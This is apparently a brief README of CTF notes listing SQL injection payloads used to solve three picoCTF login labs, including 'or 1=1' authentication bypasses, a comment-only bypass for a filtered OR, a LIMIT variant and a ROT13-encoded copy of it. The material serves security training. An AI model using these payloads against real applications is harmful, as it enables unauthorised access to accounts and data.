# NISRA_SQLi

## labs from picoCTF (0x0~0x3)
* lab1
```
admin' or 1=1 -- 
```

* lab2
    * OR is filtered.
```
admin' -- 
```

* lab3
    * limit
```
SELECT * FROM admin where password = '123'
```
```
' or 1=1 limit 0,1 -- 
' be 1=1 yvzvg 0,1 -- 
```


## TODO

* Turn lab 1~3 links into short links